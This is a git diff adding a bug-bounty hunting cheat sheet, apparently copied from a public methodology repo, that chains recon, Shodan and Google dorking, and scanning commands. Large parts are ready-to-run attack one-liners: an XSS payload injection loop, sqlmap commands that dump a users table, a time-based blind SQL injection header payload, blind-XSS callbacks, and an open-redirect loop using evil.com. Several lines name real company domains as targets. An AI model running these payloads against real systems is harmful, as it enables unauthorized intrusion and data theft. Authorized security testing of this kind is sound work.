@@ -304,4 +304,268 @@ __Other Resources:__
 
 
 
-     
+# methodology number 4
+- Source : [https://github.com/WadQamar10/My-Hunting-Methodology-/tree/main](https://github.com/WadQamar10/My-Hunting-Methodology-/tree/main)
+
+## Recon :-
+
+- subfinder
+```
+subfinder -dL domains.txt -o subfinder.txt
+subfinder -d inholland.nl -o subfinder.txt
+```
+- amass
+```
+go install -v github.com/OWASP/Amass/v3/...@master
+amass enum -passive -norecursive -noalts -df domains.txt -o amass.txt
+```
+- crtfinder
+```
+python3 crtfinder.py -u alloyhome.com
+```
+- sublist3r
+```
+sublist3r -d safesavings.com -o sublist3r.txt
+```
+- Dork
+```
+- site:*.ibm.com -site:www.ibm.com
+```
+
+## Subdomain Takeover :-
+
+1- Recon (live-subs.txt)
+- Nuclei :-
+```
+- nuclei -t /root/nuclei-templates/takeovers/ -l live-subs.txt
+```
+- Subzy :-  https://github.com/LukaSikic/subzy
+```
+- subzy run --targets live-subs.txt
+- subzy run --target test.google.com
+- subzy run --target test.google.com,https://test.yahoo.com
+```
+
+## virtual Host scanner :-
+```
+- git clone https://github.com/jobertabma/virtual-host-discovery.git
+- ruby scan.rb --ip=151.101.194.133 --host=cisco.com
+```
+
+## JS Hunting :-
+
+```
+- ﻿echo target.com | gau | grep ".js" | httpx -content-type | grep 'application/javascript'" | awk '{print $1}' | nuclei -t /root/nuclei-templates/exposures/ -silent > secrets.txt
+- echo uber.com | gau | grep '\.js$' | httpx -status-code -mc 200 -content-type | grep 'application/javascript'
+```
+- JSS-Scanner :-
+```
+- echo "invisionapp.com" | waybackurls | grep -iE '\.js'|grep -ivE '\.json'|sort -u  > j.txt
+- python3 JSScanner.py
+```
+
+## Shodan Dorking :-
+```
+- ssl.cert.subject.CN:"gevme.com*" 200
+- ssl.cert.subject.CN:"*.target.com" "230 login successful" port:"21"
+- ssl.cert.subject.CN:"*.target.com"+200 http.title:"Admin"
+- Set-Cookie:"mongo-express=" "200 OK"
+- ssl:"invisionapp.com" http.title:"index of / "
+- ssl:"arubanetworks.com" 200 http.title:"dashboard"
+- net:192.168.43/24, 192.168.40/24
+- AEM Login panel :-  git clone https://github.com/0ang3el/aem-hacker.git
+```
+
+
+
+## Collect all interisting ips from Shodan and save them in ips.txt
+```
+- cat ips.txt | httpx > live-ips.txt
+- cat live_ips.txt | dirsearch --stdin
+```
+
+
+## Google dorking :-
+```
+- site:*.gapinc.com inurl:”*admin | login” | inurl:.php | .asp
+- intext:"index of /.git"
+- site:*.*.edu intext:"sql syntax near" | intext:"syntax error has occurred" | intext:"incorrect syntax near" | intext:"unexpected end of SQL command" | intext:"Warning: mysql_connect()" | intext:"Warning: mysql_query()" | intext:"Warning: pg_connect()"
+- site:*.mil link:www.facebook.com | link:www.instagram.com | link:www.twitter.com | link:www.youtube.com | link:www.telegram.com |
+link:www.hackerone.com | link:www.slack.com | link:www.github.com
+- inurl:/geoserver/web/ (intext:2.21.4 | intext:2.22.2)
+- inurl:/geoserver/ows?service=wfs
+```
+
+
+## Github Dorking on live-subs.txt :-
+
+- git-Grabber :
+```
+- python3 gitGraber.py -k wordlists/keywords.txt -q "yahoo" -s
+
+- python3 gitGraber.py -k wordlists/keywords.txt -q \"yahoo.com\" -s
+
+- python3 gitGraber.py -k keywordsfile.txt -q \"yahoo.com\" -s -w mywordlist.txt
+```
+
+
+## XSS :-
+
+- Paramspider :
+```
+- python3 paramspider.py --domain indrive.com
+- python3 paramspider.py --domain https://cpcalendars.cartscity.com --exclude woff,css,js,png,svg,php,jpg --output g.txt
+- cat indrive.txt | kxss  ( looking for reflected :-  "<> )
+```
+
+## Looking for Hidden parameters :-
+- Arjun :- 
+```
+- arjun -u https://44.75.33.22wms/wms.login -w burp-parameter-names.txt
+- waybackurls youneedabudget.com | gf xss | grep '=' | qsreplace '"><script>confirm(1)</script>' | while read host do ; do curl --silent --path-as-is --insecure "$host" | grep -qs "<script>confirm(1)" && echo "$host \033[0;31mVulnerable\n";done
+- dalfox url https://access.epam.com/auth/realms/plusx/protocol/openid-connect/auth?response_type=code -b https://hahwul.xss.ht
+- dalfox file urls.txt -b https://hahwul.xss.ht
+- echo "https://target.com/some.php?first=hello&last=world" | Gxss -c 100
+- cat urls.txt | Gxss -c 100 -p XssReflected
+```
+
+## Sql Injection :-
+```
+- echo https://www.recreation.gov | waybackurls | grep "\?" | uro | httpx -silent > param.txt
+- cat subdomains.txt | waybackurls | grep "\?" | uro | httpx -silent > param.txt
+- sqlmap -m param.txt --batch --random-agent --level 1 | tee sqlmap.txt
+- sqlmap -u https://my.easyname.at/en/login --dbs --forms --crawl=2
+```
+
+## SQLi One Linear :
+```
+- cat target.com | waybackurls | grep "\?" | uro | httpx -silent > urls;sqlmap -m urls --batch --random-agent --level 1 | tee sqlmap.txt
+- subfinder -dL domains.txt | dnsx | waybackurls | uro | grep "\?" | head -20 | httpx -silent > urls;sqlmap -m urls --batch --random-agent --level 1 | tee sqlmap.txt
+```
+
+## Dump-Data :-
+```
+- sqlmap -u http://testphp.vulnweb.com/AJAX/infocateg.php?id=1 --dbs  (Databases)
+
+- sqlmap -u http://testphp.vulnweb.com/AJAX/infocateg.php?id=1 --tables -D acuart (Dump DB tables )
+
+- sqlmap -u http://testphp.vulnweb.com/AJAX/infocateg.php?id=1 --columns -T users (Dump Table Columns )
+
+- sqlmap -u http://testphp.vulnweb.com/AJAX/infocateg.php?id=1 --dump -D acuart -T users
+```
+
+## SSTI :-
+
+FOR Testing SSTI and tplmap tool :
+
+```
+- git clone https://github.com/epinna/tplmap.git
+
+- ./tplmap.py -u "domain.com/?parameter=SSTI*"
+
+- httpx -l live_subs.txt --status-code --title -mc 200 -path /phpinfo.php
+
+- httpx -l live_subs.txt --status-code --title -mc 200 -path /composer.json
+```
+
+
+## Testing for xss and sqli at the same time 
+
+```
+- cat subdomains.txt | waybackurls | uro | grep "\?" | httpx -silent > param.txt
+
+- sqlmap -m param.txt --batch --random-agent --level 1 | tee sqlmap.txt
+
+- cat param.txt | kxss   
+```
+
+## Blind SQL Injection :-
+
+Tips : `X-Forwarded-For: 0'XOR(if(now()=sysdate(),sleep(10),0))XOR'Z`
+
+
+## Blind XSS :-
+
+```
+site:opsgenie.com inurl:"contact" | inurl:"contact-us" | inurl:"contactus" | inurl:"contcat_us" | inurl:"contact_form" | inurl:"contact-form"
+```
+
+## Hunting For Cors Misconfigration :-
+
+- https://github.com/chenjj/CORScanner
+
+```
+pip install corscanner
+
+corscanner -i live_subdomains.txt -v -t 100
+
+https://github.com/Tanmay-N/CORS-Scanner
+
+go install github.com/Tanmay-N/CORS-Scanner@latest
+
+cat CORS-domain.txt | CORS-Scanner
+```
+
+## Nmap Scanning :-
+```
+#- nmap -sS -p- 192.168.1.4  (-sS) Avoid Firewell && Connection Log.
+
+#- nmap -sS -p- -iL hosts.txt 
+
+#- nmap -Pn -sS -A -sV -sC -p 17,80,20,21,22,23,24,25,53,69,80,123,443,1723,4343,8081,8082,8088,53,161,177,3306,8888,27017,27018,139,137,445,8080,8443 -iL liveips.txt -oN scan-result.txt
+
+
+#- nmap -Pn -A -sV -sC 67.20.129.216 -p 17,80,20,21,22,23,24,25,53,69,80,123,443,1723,4343,8081,8082,8088,53,161,177,3306,8888,27017,27018,139,137,445,8080,8443 -oN scan-result.txt --script=vuln
+
+#- nmap -sT -p- 192.168.1.4    (Full Scan (TCP)).
+
+#- nmap -sT -p- 192.168.1.5 --script=banner (Services Fingerprinting).
+
+#- nmap -sV 192.168.1.4 (Services Fingerprinting).
+
+#- nmap 192.168.1.5 -O   (OS Fingerprinting).
+
+#- nmap 192.168.1.0-255 -sn  (-sn) Live Hosts with me in network.
+
+#- nmap -iL hosts.txt -sn
+
+
+#- nc -nvz 192.168.1.4 1-65535  (Port Scanning Using nc).
+
+#- nc -vn 34.66.209.2 22        (Services Fingerprinting).
+
+
+#- netdiscover     (Devices On Network) (Layer2).
+
+#- netdiscover -r 192.168.2.0/24  (Range).
+
+#- netdiscover -p        (Passive).
+
+#- netdiscover -l hosts.txt
+```
+
+
+## Running Nuclei :-
+
+Scanning target domain with community-curated nuclei templates :-
+```
+- nuclei -u https://example.com
+
+- nuclei -list urls.txt -t /fuzzing-templates
+
+- nuclei -list live-subs.txt -t /root/nuclei-templates/vulnerabilities -t /root/nuclei-templates/cves -t /root/nuclei-templates/exposures -t /root/nuclei-templates/sqli.yaml
+
+- nuclei -u https://example.com -w workflows/
+```
+
+## Open Redirect:- 
+
+Open Redirection OneLiner :-
+```
+
+- waybackurls tesorion.nl | grep -a -i \=http | qsreplace 'evil.com' | while read host do;do curl -s -L $host -I| grep "evil.com" && echo "$host \033[0;31mVulnerable\n" ;done
+
+- httpx -l i.txt -path "///evil.com" -status-code -mc 302
+```
+
+-----
